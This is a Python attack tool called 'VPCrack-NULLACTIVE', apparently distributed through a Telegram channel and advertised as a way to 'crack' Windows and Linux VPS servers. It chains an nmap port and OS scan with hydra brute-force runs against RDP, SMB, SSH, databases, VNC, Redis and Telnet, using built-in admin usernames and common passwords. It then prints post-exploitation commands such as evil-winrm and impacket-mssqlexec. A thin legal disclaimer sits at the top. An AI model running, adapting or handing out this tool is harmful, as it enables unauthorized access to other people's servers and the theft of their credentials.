#!/usr/bin/env python3
# ====================================================================
# ███╗   ██╗██╗   ██╗██╗     ██╗      █████╗  ██████╗████████╗██╗██╗   ██╗███████╗
# ████╗  ██║██║   ██║██║     ██║     ██╔══██╗██╔════╝╚══██╔══╝██║██║   ██║██╔════╝
# ██╔██╗ ██║██║   ██║██║     ██║     ███████║██║        ██║   ██║██║   ██║█████╗
# ██║╚██╗██║██║   ██║██║     ██║     ██╔══██║██║        ██║   ██║╚██╗ ██╔╝██╔══╝
# ██║ ╚████║╚██████╔╝███████╗███████╗██║  ██║╚██████╗   ██║   ██║ ╚████╔╝ ███████╗
# ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝
# ====================================================================
#
#   VPCrack-NULLACTIVE — Virtual Server Crack Suite v4.2
#   ██████  ███████ ███    ██ ████████ ███████ ███████ ████████
#   ██   ██ ██      ████   ██    ██    ██      ██         ██
#   ██████  █████   ██ ██  ██    ██    █████   █████      ██
#   ██      ██      ██  ██ ██    ██    ██      ██         ██
#   ██      ███████ ██   ████    ██    ███████ ███████    ██
#
#   👑 Developer Channel : https://t.me/Nullactive
#   👤 Developer ID      : @Net_activenull
#   📡 Telegram Channel for Latest Updates & Tools
#
#   🛡️  LEGAL DISCLAIMER:
#   This tool is for authorized penetration testing and educational
#   purposes only. Users are responsible for complying with all
#   applicable laws. Unauthorized access is illegal.
# ====================================================================

import argparse
import socket
import subprocess
import sys
import os
import json
import time
import threading
import signal
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import List, Tuple, Optional, Dict
from queue import Queue

# ====================================================================
# 🔥 BRANDING — EVERYONE KNOWS WHO MADE THIS
# ====================================================================
DEVELOPER_TG   = "@Net_activenull"
CHANNEL_TG     = "https://t.me/Nullactive"
TOOL_NAME      = "VPCrack-NULLACTIVE"
VERSION        = "4.2"
BUILD_DATE     = "2026-08-28"

# ====================================================================
# COLOR CODES — BECAUSE REAL HACKERS USE COLORS
# ====================================================================
R = '\033[91m'    # Red
G = '\033[92m'    # Green
Y = '\033[93m'    # Yellow
B = '\033[94m'    # Blue
M = '\033[95m'    # Magenta
C = '\033[96m'    # Cyan
W = '\033[97m'    # White
N = '\033[0m'     # Reset
BOLD = '\033[1m'  # Bold
BLINK = '\033[5m' # Blink (seen on some terminals)

BANNER = f"""
{BOLD}{M}┌──────────────────────────────────────────────────────────┐
│{C}  ██╗   ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗ {M}│
│{C}  ██║   ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝ {M}│
│{C}  ██║   ██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝  {M}│
│{C}  ╚██╗ ██╔╝██╔═══╝ ██║     ██╔══██╗██╔══██║██║     ██╔═██╗  {M}│
│{C}   ╚████╔╝ ██║     ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗ {M}│
│{C}    ╚═══╝  ╚═╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ {M}│
│{G}               Virtual Server Crack Suite v{VERSION}{M}               │
├──────────────────────────────────────────────────────────┤
│{Y}  👑 Developer : {C}{DEVELOPER_TG}{Y}                        │
│{Y}  📡 Channel   : {C}{CHANNEL_TG}{Y}           │
│{Y}  💀 Power     : {R}Windows + Linux VPS FULL CRACK{Y}       │
└──────────────────────────────────────────────────────────┘{N}
"""

# ====================================================================
# SERVICE PROFILES — WINDOWS & LINUX TARGETS
# ====================================================================
WINDOWS_SERVICES = {
    3389: {"name": "RDP",       "tool": "hydra",     "module": "rdp"},
    445:  {"name": "SMB",       "tool": "hydra",     "module": "smb"},
    5985: {"name": "WinRM",     "tool": "hydra",     "module": "http-post-form"},
    5986: {"name": "WinRM-SSL", "tool": "hydra",     "module": "https-post-form"},
    1433: {"name": "MSSQL",     "tool": "hydra",     "module": "mssql"},
    21:   {"name": "FTP",       "tool": "hydra",     "module": "ftp"},
}

LINUX_SERVICES = {
    22:   {"name": "SSH",       "tool": "hydra",     "module": "ssh"},
    3306: {"name": "MySQL",     "tool": "hydra",     "module": "mysql"},
    5432: {"name": "PostgreSQL","tool": "hydra",     "module": "postgres"},
    5900: {"name": "VNC",       "tool": "hydra",     "module": "vnc"},
    6379: {"name": "Redis",     "tool": "hydra",     "module": "redis"},
    27017:{"name": "MongoDB",   "tool": "hydra",     "module": "mongodb"},
    21:   {"name": "FTP",       "tool": "hydra",     "module": "ftp"},
    23:   {"name": "Telnet",    "tool": "hydra",     "module": "telnet"},
}

ADMIN_USERS_WIN = ["Administrator", "admin", "administrator", "root"]
ADMIN_USERS_LINUX = ["root", "admin", "ubuntu", "debian", "centos", "user", "test"]
COMMON_PASSWORDS = [
    "admin", "admin123", "password", "123456", "12345678", "qwerty", "passw0rd",
    "root", "toor", "P@ssw0rd", "Pa$$w0rd", "admin@123", "Admin123", "letmein",
    "welcome", "Welcome@123", "Welcome1", "Passw0rd!", "123qwe", "qwe123", "1q2w3e4r",
    "Server123", "server", "vm123", "VPS123", "windows", "linux", "Default",
    "administrator", "Admin", "password123", "Password1", "Pass@123", "changeme",
    "123qweasd", "qwerty123", "1qaz2wsx", "zaq1xsw2", "test", "test123"
]

# ====================================================================
# OUTPUT FILE
# ====================================================================
RESULTS_FILE = f"VPCrack_NULLACTIVE_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

def banner():
    """Display the main banner with branding."""
    print(BANNER)
    print(f"{BOLD}{M}[+] {C}Developer : {Y}{DEVELOPER_TG}{N}")
    print(f"{BOLD}{M}[+] {C}Channel   : {Y}{CHANNEL_TG}{N}")
    print(f"{BOLD}{M}[+] {C}Version   : {Y}{VERSION}{N}")
    print(f"{BOLD}{M}[+] {C}Build     : {Y}{BUILD_DATE}{N}")
    print(f"{BOLD}{M}[+] {C}Platforms : {R}Windows Server{R} + {G}Linux Server{G}{N}")
    print(f"{'='*60}\n")

def log(msg: str, color: str = W, end: str = "\n"):
    """Pretty logging with timestamps."""
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{B}[{ts}]{N} {color}{msg}{N}", end=end)
    # Also write to results file
    with open(RESULTS_FILE, "a", encoding="utf-8") as f:
        clean = msg.replace(R,"").replace(G,"").replace(Y,"").replace(B,"").replace(M,"").replace(C,"").replace(W,"").replace(N,"").replace(BOLD,"").replace(BLINK,"")
        f.write(f"[{ts}] {clean}\n")

def section(title: str):
    """Print a section header."""
    print(f"\n{BOLD}{C}╔═══ {title} ═══╗{N}\n")
    with open(RESULTS_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n===== {title} =====\n")

def check_tools() -> List[str]:
    """Verify that required tools are installed."""
    required = ["nmap", "hydra", "curl", "nc"]
    missing = []
    for tool in required:
        r = subprocess.run(["which", tool], capture_output=True, text=True)
        if r.returncode != 0:
            missing.append(tool)
    return missing

# ====================================================================
# PHASE 1: RECON & PORT SCAN
# ====================================================================
def phase_scan(target: str, speed: int = 1000) -> Dict[int, str]:
    """Scan target with nmap to find open ports."""
    section(f"PHASE 1: RECONNAISSANCE — Target: {target}")

    log(f"[*] Scanning all ports on {target}...", B)
    log(f"[*] Speed: {speed} packets/sec", B)
    
    # Fast scan with nmap
    cmd = [
        "nmap", "-sS", "-sV", "--version-intensity", "5",
        "-p-", "-T4", "--min-rate", str(speed),
        "-oG", "/tmp/vpc_nmap.gnmap",
        "-oN", "/tmp/vpc_nmap.txt",
        target
    ]
    
    log("[*] Running nmap SYN scan with version detection...", Y)
    start = time.time()
    
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    # Show progress spinner
    spinner = ['|', '/', '-', '\\']
    i = 0
    while proc.poll() is None:
        print(f"\r{G}[*] Scanning{spinner[i % 4]} {N}", end="", flush=True)
        i += 1
        time.sleep(0.3)
    
    stdout, stderr = proc.communicate()
    elapsed = time.time() - start
    print(f"\r{G}[+] Scan completed in {elapsed:.1f}s{N}")

    # Parse results
    open_ports = {}
    if os.path.exists("/tmp/vpc_nmap.gnmap"):
        with open("/tmp/vpc_nmap.gnmap", "r") as f:
            for line in f:
                if "Ports:" in line:
                    parts = line.split("Ports: ")
                    if len(parts) > 1:
                        port_data = parts[1].split("/")
                        for i in range(0, len(port_data)-1, 2):
                            try:
                                port_info = port_data[i].strip().split("/")
                                if len(port_info) >= 2:
                                    port_num = int(port_info[0])
                                    port_state = port_info[1].strip()
                                    if port_state == "open":
                                        open_ports[port_num] = port_data[i+1].strip() if i+1 < len(port_data) else "unknown"
                            except (ValueError, IndexError):
                                pass

    # Also parse nmap.txt as fallback
    if not open_ports and os.path.exists("/tmp/vpc_nmap.txt"):
        with open("/tmp/vpc_nmap.txt", "r") as f:
            content = f.read()
            for line in content.split("\n"):
                if "/open/" in line or "/open" in line:
                    try:
                        parts = line.strip().split()
                        for p in parts:
                            if "/tcp" in p or "/udp" in p:
                                port_num = int(p.split("/")[0])
                                open_ports[port_num] = "unknown"
                    except:
                        pass

    if open_ports:
        log(f"[+] Found {len(open_ports)} open ports!", G)
        for port, svc in sorted(open_ports.items()):
            log(f"    Port {port:5d} → {svc}", C)
    else:
        log("[-] No open ports detected. Check target or firewall.", R)
    
    return open_ports

# ====================================================================
# PHASE 2: OS DETECTION & SERVICE PROFILING
# ====================================================================
def phase_detect_os(target: str, open_ports: Dict[int, str]) -> str:
    """Detect OS based on open ports."""
    section("PHASE 2: OS DETECTION & PROFILING")
    
    windows_indicators = [3389, 445, 5985, 5986, 1433]
    linux_indicators = [22, 3306, 5432, 6379, 27017]
    
    win_score = sum(1 for p in windows_indicators if p in open_ports)
    linux_score = sum(1 for p in linux_indicators if p in open_ports)
    
    # Use nmap OS detection for better accuracy
    log("[*] Running nmap OS detection...", B)
    subprocess.run(
        ["nmap", "-O", "--osscan-guess", "-p", "22,3389,445,80,443", target],
        capture_output=True, text=True, timeout=30
    )
    
    os_type = "unknown"
    if win_score > linux_score:
        os_type = "windows"
    elif linux_score > win_score:
        os_type = "linux"
    else:
        # Try TTL probe
        try:
            ping = subprocess.run(["ping", "-c", "1", "-W", "2", target],
                                  capture_output=True, text=True, timeout=5)
            for line in ping.stdout.split("\n"):
                if "ttl=" in line.lower():
                    ttl_str = line.lower().split("ttl=")[-1].split()[0]
                    ttl = int(ttl_str)
                    os_type = "windows" if ttl <= 128 else "linux"
                    break
        except:
            pass
    
    os_emoji = f"{R}🪟 Windows{N}" if os_type == "windows" else f"{G}🐧 Linux{N}" if os_type == "linux" else f"{Y}❓ Unknown{N}"
    log(f"[+] Detected OS: {os_emoji}", G)
    
    return os_type

# ====================================================================
# PHASE 3: CREDENTIAL BRUTE FORCE — THE MAIN EVENT
# ====================================================================
def phase_crack(target: str, os_type: str, open_ports: Dict[int, str],
                wordlist: str = None, threads: int = 4, delay: int = 0) -> Dict[str, Dict]:
    """Crack credentials for all discovered services."""
    section(f"PHASE 3: 🔥 CREDENTIAL CRACKING — {os_type.upper()} SERVER")
    
    findings = {}
    
    # Select service profile based on OS
    if os_type == "windows":
        services = WINDOWS_SERVICES
        admin_users = ADMIN_USERS_WIN
    elif os_type == "linux":
        services = LINUX_SERVICES
        admin_users = ADMIN_USERS_LINUX
    else:
        # Check both
        services = {**WINDOWS_SERVICES, **LINUX_SERVICES}
        admin_users = list(set(ADMIN_USERS_WIN + ADMIN_USERS_LINUX))
    
    # Filter to only available services
    available_services = {p: s for p, s in services.items() if p in open_ports}
    
    if not available_services:
        log("[-] No crackable services found on target!", R)
        log("[*] Trying common services anyway on all ports...", Y)
        available_services = services
    
    log(f"[+] Available crackable services: {len(available_services)}", G)
    for port, svc in available_services.items():
        log(f"    {Y}→{N} Port {port:5d} — {svc['name']}", C)
    
    # Generate password list
    passlist = wordlist if wordlist and os.path.exists(wordlist) else "/tmp/vpc_passwords.txt"
    if not wordlist or not os.path.exists(wordlist):
        log("[*] Generating built-in password list...", B)
        with open("/tmp/vpc_passwords.txt", "w") as f:
            for pwd in COMMON_PASSWORDS:
                f.write(pwd + "\n")
        log(f"[+] Wrote {len(COMMON_PASSWORDS)} passwords to /tmp/vpc_passwords.txt", G)
    
    # Crack each service
    for port, svc in sorted(available_services.items()):
        service_name = svc["name"]
        module = svc["module"]
        
        log(f"\n{Y}{'='*50}{N}")
        log(f"{BOLD}[*] Attacking {service_name} on port {port}{N}", Y)
        log(f"{Y}{'='*50}{N}")
        
        # Build hydra command
        hydra_cmd = [
            "hydra",
            "-t", str(threads),
            "-V",  # verbose
            "-f",  # exit on first success
            "-o", f"/tmp/vpc_hydra_{service_name.lower()}.txt",
        ]
        
        if delay > 0:
            hydra_cmd += ["-w", str(delay)]
        
        # User/Password options
        if os_type == "windows" and service_name in ["RDP", "SMB", "WinRM", "WinRM-SSL", "MSSQL"]:
            # Windows: try common admin users
            userlist = "/tmp/vpc_users_win.txt"
            with open(userlist, "w") as f:
                for u in ADMIN_USERS_WIN:
                    f.write(u + "\n")
            hydra_cmd += ["-L", userlist, "-P", passlist]
        elif os_type == "linux" and service_name in ["SSH", "MySQL", "PostgreSQL"]:
            userlist = "/tmp/vpc_users_linux.txt"
            with open(userlist, "w") as f:
                for u in ADMIN_USERS_LINUX:
                    f.write(u + "\n")
            hydra_cmd += ["-L", userlist, "-P", passlist]
        else:
            hydra_cmd += ["-l", "root", "-P", passlist]
        
        # Service-specific module
        if service_name == "RDP":
            hydra_cmd += [f"rdp://{target}"]
        elif service_name == "SMB":
            hydra_cmd += [f"smb://{target}"]
        elif service_name == "WinRM":
            hydra_cmd += [f"http-post-form://{target}:{port}/wsman:..." ]  # complex, skip
            log(f"{Y}[!] WinRM brute-force requires custom setup. Skipping.{N}", Y)
            continue
        elif service_name == "MSSQL":
            hydra_cmd += [f"mssql://{target}"]
        elif service_name == "FTP":
            hydra_cmd += [f"ftp://{target}"]
        elif service_name == "SSH":
            hydra_cmd += [f"ssh://{target}"]
        elif service_name == "MySQL":
            hydra_cmd += [f"mysql://{target}"]
        elif service_name == "PostgreSQL":
            hydra_cmd += [f"postgres://{target}"]
        elif service_name == "VNC":
            hydra_cmd += [f"vnc://{target}"]
        elif service_name == "Redis":
            hydra_cmd += ["-l", "default", "-P", passlist, f"redis://{target}"]
        elif service_name == "MongoDB":
            hydra_cmd += ["-l", "admin", "-P", passlist, f"mongodb://{target}"]
        elif service_name == "Telnet":
            hydra_cmd += [f"telnet://{target}"]
        else:
            log(f"{R}[-] Unknown module for {service_name}, skipping{N}", R)
            continue
        
        # Execute hydra
        try:
            log(f"[*] Running hydra against {service_name}...", B)
            log(f"[*] Command: {' '.join(hydra_cmd)}", C)
            
            proc = subprocess.Popen(
                hydra_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            found_cred = False
            for line in proc.stdout:
                line = line.strip()
                if line:
                    print(f"{Y}  {line}{N}")
                    
                    if "[SUCCESS]" in line or "password" in line.lower() and "found" in line.lower():
                        found_cred = True
                        find_cred_line = line
            
            proc.wait()
            
            # Parse hydra output
            result_file = f"/tmp/vpc_hydra_{service_name.lower()}.txt"
            if os.path.exists(result_file):
                with open(result_file, "r") as f:
                    content = f.read()
                    if "password:" in content.lower() or "login:" in content.lower() or "host:" in content.lower():
                        log(f"{G}[✅] CREDENTIALS FOUND for {service_name}!{N}", G)
                        log(f"{G}[🔑] Check {result_file}{N}", G)
                        findings[service_name] = {"port": port, "file": result_file, "data": content}
                        
                        # Save to global results
                        with open(RESULTS_FILE, "a", encoding="utf-8") as rf:
                            rf.write(f"\n🔥 CREDENTIAL FOUND — {service_name} on {target}:{port}\n")
                            rf.write(content + "\n")
                            rf.write(f"{'='*50}\n")
            
            if not found_cred:
                log(f"{R}[-] No credentials found for {service_name}{N}", R)
                
        except Exception as e:
            log(f"{R}[!] Hydra error on {service_name}: {e}{N}", R)
    
    return findings

# ====================================================================
# PHASE 4: POST-EXPLOITATION CHECK
# ====================================================================
def phase_post_exploit(target: str, os_type: str, findings: Dict):
    """Verify discovered credentials and suggest next steps."""
    section("PHASE 4: POST-EXPLOITATION VERIFICATION")
    
    if not findings:
        log("[-] No credentials found in previous phase.", R)
        log("[*] Suggestions:", Y)
        log("  • Use a larger wordlist (rockyou.txt)", Y)
        log("  • Try default credentials for specific services", Y)
        log("  • Check for anonymous/null sessions on SMB", Y)
        return
    
    log(f"[+] {len(findings)} services compromised!", G)
    log("\n🔥 CRACKED SERVICES SUMMARY:", BOLD)
    for service, info in findings.items():
        log(f"  {G}✅ {service}:{N} {C}{target}:{info['port']}{N}", G)
    
    if os_type == "windows":
        log("\n⚡ WINDOWS POST-EXPLOIT COMMANDS:", BOLD)
        log(f"  RDP   :  xfreerdp /u:Administrator /p:'password' /v:{target}", G)
        log(f"  SMB   :  smbclient -L //{target} -U Administrator", G)
        log(f"  WinRM :  evil-winrm -i {target} -u Administrator -p 'password'", G)
        log(f"  MSSQL :  impacket-mssqlexec Administrator:'password'@{target}", G)
    else:
        log("\n⚡ LINUX POST-EXPLOIT COMMANDS:", BOLD)
        log(f"  SSH   :  ssh root@{target}", G)
        log(f"  MySQL :  mysql -h {target} -u root -p", G)
        log(f"  VNC   :  vncviewer {target}", G)
    
    log(f"\n📄 Full results saved to: {C}{RESULTS_FILE}{N}", G)

# ====================================================================
# EXTRA: NLA BYPASS & SPECIAL ATTACKS
# ====================================================================
def phase_advanced(target: str, os_type: str, open_ports: Dict[int, str]):
    """Advanced techniques: NLA bypass, Crowbar, etc."""
    section("PHASE 5: 🧠 ADVANCED ATTACKS")
    
    # RDP NLA Bypass with Crowbar
    if 3389 in open_ports:
        log("[*] Checking for Crowbar (RDP-NLA brute-force)...", B)
        crowbar_check = subprocess.run(
            ["which", "crowbar"],
            capture_output=True, text=True
        )
        if crowbar_check.returncode == 0:
            log("[+] Crowbar installed. Use for RDP with NLA:", G)
            log(f"    crowbar -b rdp -s {target}/32 -u administrator -C /path/to/wordlist", Y)
        else:
            log("[*] Crowbar not installed. Install: sudo apt install crowbar", Y)
    
    # SMB anonymous access check
    if 445 in open_ports:
        log("\n[*] Checking SMB null/anonymous session...", B)
        smb_cmd = f"smbclient -N -L //{target} 2>&1 | head -20"
        result = subprocess.run(
            ["smbclient", "-N", "-L", f"//{target}"],
            capture_output=True, text=True, timeout=10
        )
        if "NT_STATUS_ACCESS_DENIED" not in result.stdout and "NT_STATUS_LOGON_FAILURE" not in result.stdout:
            if result.stdout.strip():
                log(f"[⚠️] Anonymous SMB access possible! {G}", G)
                for line in result.stdout.split("\n")[:10]:
                    log(f"    {line.strip()}", C)
            else:
                log("[-] No anonymous SMB access", R)
        else:
            log("[-] SMB anonymous access denied", R)
    
    # SSH weak key check
    if 22 in open_ports:
        log("\n[*] Checking SSH key exchange algorithms...", B)
        ssh_audit = subprocess.run(
            ["which", "ssh-audit"],
            capture_output=True, text=True
        )
        if ssh_audit.returncode == 0:
            log("[+] Run detailed SSH audit:", G)
            log(f"    ssh-audit {target}", Y)

# ====================================================================
# MAIN CONTROLLER
# ====================================================================
def main():
    """Main execution flow."""
    # Register signal handler for clean exit
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    
    banner()
    
    # Parse arguments
    parser = argparse.ArgumentParser(
        description=f"{TOOL_NAME} v{VERSION} — Windows & Linux VPS Crack Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
╔══════════════════════════════════════════════════════════╗
║  👑 Developer : {DEVELOPER_TG}                  ║
║  📡 Channel   : {CHANNEL_TG}    ║
║  💀 Crack Windows & Linux Servers Like a Pro       ║
╚══════════════════════════════════════════════════════════╝
        """
    )
    
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("-w", "--wordlist", help="Path to custom password wordlist")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Threads per service (default: 4)")
    parser.add_argument("--speed", type=int, default=1000, help="Scan speed pkt/sec (default: 1000)")
    parser.add_argument("--delay", type=int, default=0, help="Delay between attempts in seconds")
    parser.add_argument("--quick", action="store_true", help="Quick mode: scan top 100 ports only")
    parser.add_argument("--no-scan", action="store_true", help="Skip port scan, use predefined ports")
    parser.add_argument("--version", action="version", version=f"{TOOL_NAME} v{VERSION} by {DEVELOPER_TG}")
    
    args = parser.parse_args()
    
    # Initialize results file
    with open(RESULTS_FILE, "w", encoding="utf-8") as f:
        f.write(f"""╔══════════════════════════════════════════════════════════╗
║ {TOOL_NAME} v{VERSION} — Results File
║ Target     : {args.target}
║ Date       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
║ Developer  : {DEVELOPER_TG}
║ Channel    : {CHANNEL_TG}
╚══════════════════════════════════════════════════════════╝

{'='*60}
""")
    
    # Check dependencies
    log("[*] Checking required tools...", B)
    missing = check_tools()
    if missing:
        log(f"{R}[!] Missing tools: {', '.join(missing)}{N}", R)
        log(f"{Y}[!] Install: sudo apt install {' '.join(missing)}{N}", Y)
        if "hydra" in missing or "nmap" in missing:
            log(f"{R}[-] Critical tools missing. Aborting.{N}", R)
            sys.exit(1)
    else:
        log(f"{G}[+] All tools available!{N}", G)
    
    # Resolve target
    try:
        ip = socket.gethostbyname(args.target)
        log(f"{G}[+] Target resolved: {args.target} → {ip}{N}", G)
    except:
        log(f"{R}[-] Cannot resolve {args.target}{N}", R)
        sys.exit(1)
    
    # Phase 1: Scan
    if args.no_scan:
        log("[*] Skipping scan — using all common ports", Y)
        open_ports = {p: "unknown" for p in list(WINDOWS_SERVICES.keys()) + list(LINUX_SERVICES.keys())}
    else:
        ports = "T:1-65535" if not args.quick else "T:21-25,53,80,443,3306,3389,445,1433,5432,5900,5985,5986,6379,27017,8080,8443"
        open_ports = phase_scan(ip, args.speed)
    
    # Phase 2: OS Detection
    os_type = phase_detect_os(ip, open_ports)
    
    # Phase 3: CRACK
    findings = phase_crack(ip, os_type, open_ports, args.wordlist, args.threads, args.delay)
    
    # Phase 4: Post-exploit
    phase_post_exploit(ip, os_type, findings)
    
    # Phase 5: Advanced
    phase_advanced(ip, os_type, open_ports)
    
    # FINAL SUMMARY
    section("🏁 FINAL SUMMARY")
    
    print(f"""
{BOLD}{M}╔══════════════════════════════════════════════════════════╗
║{C}  🎯 Target       : {Y}{ip}{C}{M}                         ║
║{C}  💻 OS Detected  : {Y}{os_type.upper()}{M}                      ║
║{C}  🔓 Cracked Svc  : {Y}{len(findings)}{M}                         ║
║{C}  📄 Results File : {Y}{RESULTS_FILE}{M}  ║
╠══════════════════════════════════════════════════════════╣
║{G}  👑 Powered by {DEVELOPER_TG}{M}              ║
║{G}  📡 Channel : {CHANNEL_TG}{M}  ║
║{R}  💀 REMEMBER: With great power comes great responsibility{N} ║
╚══════════════════════════════════════════════════════════╝{N}
""")
    
    if findings:
        log(f"{G}[🔥] CREDENTIALS DUMP:{N}", G)
        for service, info in findings.items():
            log(f"     {G}✅ {service}:{N} {C}See {info['file']}{N}", G)
        
        log(f"\n{BOLD}{Y}📢 Share your success with the crew:{N}")
        log(f"{BOLD}{Y}   Join: {C}{CHANNEL_TG}{N}")
        log(f"{BOLD}{Y}   Dev : {C}{DEVELOPER_TG}{N}")
    else:
        log(f"{Y}[!] No credentials found this run.{N}", Y)
        log(f"{Y}[*] Try with a larger wordlist or lower thread count.{N}", Y)
        log(f"{Y}[*] Some services may have account lockout policies.{N}", Y)
    
    print(f"\n{BOLD}{M}🎯 Happy Hacking! — {DEVELOPER_TG}{N}")
    print(f"{BOLD}{M}📡 Join: {C}{CHANNEL_TG}{N}\n")


if __name__ == "__main__":
    main()
